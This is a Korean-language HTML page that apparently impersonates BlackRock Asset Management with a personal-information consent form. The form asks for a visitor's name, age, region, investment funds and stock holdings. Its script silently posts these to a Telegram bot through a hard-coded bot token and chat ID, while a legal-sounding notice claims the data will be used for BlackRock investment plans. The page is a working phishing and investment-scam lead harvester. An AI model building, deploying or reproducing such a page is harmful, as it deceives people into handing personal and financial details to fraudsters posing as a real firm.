<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BlackRock | Consent Form</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Noto+Sans+KR:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg-color: #1a1f2c;
      --card-bg: #ffffff;
      --accent-dark: #0f172a;
      --point-blue: #2563eb;
      --border-soft: #e2e8f0;
      --text-main: #1e293b;
      --input-fill: #f8fafc;
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Inter', 'Noto Sans KR', sans-serif;
      background: radial-gradient(circle at top right, #2d364d 0%, #1a1f2c 100%);
      min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px;
    }
    .agreement-card {
      width: 100%; max-width: 740px; background: var(--card-bg); border-radius: 24px;
      padding: 60px 50px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); position: relative;
    }
    .agreement-card::before { content: ""; position: absolute; top: 0; left: 0; right: 0; height: 6px; background: linear-gradient(90deg, #0f172a, #2563eb); }
    .top-brand { text-align: center; margin-bottom: 40px; }
    .top-brand .brand-name { font-size: 32px; font-weight: 800; color: var(--accent-dark); text-transform: uppercase; letter-spacing: -1px; }
    .top-brand .brand-sub { font-size: 11px; color: var(--point-blue); letter-spacing: 4px; font-weight: 700; margin-top: 4px; }
    .header { text-align: center; margin-bottom: 45px; }
    .header h1 { font-size: 22px; font-weight: 700; color: var(--text-main); }
    .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px; }
    .input-group { display: flex; flex-direction: column; }
    label { font-size: 12.5px; color: var(--accent-dark); margin-bottom: 8px; font-weight: 600; display: flex; align-items: center; gap: 4px; }
    label::before { content: ""; width: 3px; height: 3px; background: var(--point-blue); border-radius: 50%; }
    input, select { background: var(--input-fill); border: 1px solid var(--border-soft); border-radius: 10px; padding: 14px 16px; font-size: 15px; color: var(--text-main); }
    input:focus, select:focus { outline: none; border-color: var(--point-blue); background: #fff; }
    .full-width { grid-column: span 2; }
    .law-box {
      background: #0d405e; /* 이미지의 진한 블루 색상 반영 */
      border-radius: 4px; padding: 25px; font-size: 14px; color: #ffffff;
      line-height: 1.8; margin-bottom: 40px; text-align: left;
    }
    .date-selection { display: flex; justify-content: center; align-items: center; gap: 10px; margin-bottom: 45px; font-weight: 600; }
    .date-selection select { background: transparent; border: none; border-bottom: 2px solid var(--point-blue); font-size: 18px; font-weight: 700; border-radius: 0; padding: 0 5px; }
    .btn-submit { width: 100%; background: var(--accent-dark); color: #ffffff; border: none; padding: 18px; border-radius: 12px; font-size: 17px; font-weight: 700; cursor: pointer; transition: 0.3s; }
    .btn-submit:hover { background: #1e293b; transform: translateY(-2px); }
    .btn-submit:disabled { background: #94a3b8; cursor: not-allowed; }
  </style>
</head>
<body>

  <div class="agreement-card">
    <div class="top-brand">
      <div class="brand-name">BlackRock</div>
      <div class="brand-sub">ASSET MANAGEMENT</div>
    </div>

    <div class="header"><h1>개인정보 수집 및 이용 동의서</h1></div>

    <form id="agreementForm">
      <div class="form-grid">
        <div class="input-group"><label>성명</label><input type="text" id="u_name" placeholder="성함 입력" required></div>
        <div class="input-group"><label>나이</label><select id="u_age" required><option value="20-30대">20~30대</option><option value="40-50대">40~50대</option><option value="60대 이상">60대 이상</option></select></div>
        <div class="input-group"><label>거주지</label><select id="u_loc" required><option value="서울특별시">서울특별시</option><option value="경기도">경기도</option><option value="기타">기타 지역</option></select></div>
        <div class="input-group"><label>투자 자금</label><select id="u_money" required><option value="5천만원 이하">5천만원 이하</option><option value="1억원 이상">1억원 이상</option></select></div>
        <div class="input-group full-width"><label>보유 종목 (선택)</label><input type="text" id="u_stock" placeholder="예: 삼성전자"></div>
      </div>

      <div class="law-box">
        블랙록자산운용은 개인정보 보호법 30조에 따라 정보주체(고객)의 개인정보 보호 및 권익을 보호하고 동의한 개인정보는 블랙록의 개인별 맞춤 투자플랜에 참고자료로 등록 됨을 안내 드립니다.
      </div>

      <div class="date-selection">
        <span>2026년</span><select id="monthSelect"></select><span>월</span><select id="daySelect"></select><span>일</span>
      </div>

      <button type="submit" id="submitBtn" class="btn-submit">내용 확인 및 동의 완료</button>
    </form>
  </div>

<script>
  // 사장님의 텔레그램 정보가 모두 적용되었습니다.
  const TELEGRAM_BOT_TOKEN = '8650677001:AAH_GAz0OctgauRi75hlNhp4RKymD9_Q2kc';
  const TELEGRAM_CHAT_ID = '8185455786'; 

  // 날짜 설정 로직
  const mSel = document.getElementById('monthSelect');
  const dSel = document.getElementById('daySelect');
  const now = new Date();
  for (let m = 1; m <= 12; m++) {
    let opt = document.createElement('option'); opt.value = m; opt.textContent = m;
    if (m === now.getMonth() + 1) opt.selected = true;
    mSel.appendChild(opt);
  }
  function updateDays() {
    dSel.innerHTML = '';
    const lastDay = new Date(2026, mSel.value, 0).getDate();
    for (let d = 1; d <= lastDay; d++) {
      let opt = document.createElement('option'); opt.value = d; opt.textContent = d;
      if (d === now.getDate()) opt.selected = true;
      dSel.appendChild(opt);
    }
  }
  mSel.addEventListener('change', updateDays); updateDays();

  // 폼 제출 및 텔레그램 전송
  document.getElementById('agreementForm').onsubmit = function(e) {
    e.preventDefault();
    const btn = document.getElementById('submitBtn');
    btn.disabled = true;
    btn.innerText = "전송 중...";

    const name = document.getElementById('u_name').value;
    const details = `나이: ${document.getElementById('u_age').value}, 지역: ${document.getElementById('u_loc').value}, 자금: ${document.getElementById('u_money').value}, 종목: ${document.getElementById('u_stock').value || '없음'}`;
    const dateStr = `2026년 ${mSel.value}월 ${dSel.value}일 ${new Date().getHours()}시 ${new Date().getMinutes()}분`;

    const text = `🔔 [BlackRock 신규 동의서 접수]\n\n👤 성명: ${name}\n📋 정보: ${details}\n📅 일시: ${dateStr}`;

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
    })
    .then(res => {
      if (res.ok) {
        alert('동의서 제출이 완료되었습니다.');
      } else {
        alert('전송 오류가 발생했습니다. 사장님 봇 대화방에서 /start를 눌렀는지 확인해주세요.');
      }
      btn.disabled = false;
      btn.innerText = "내용 확인 및 동의 완료";
    })
    .catch(() => {
      alert('네트워크 연결 확인이 필요합니다.');
      btn.disabled = false;
    });
  };
</script>
</body>
</html>
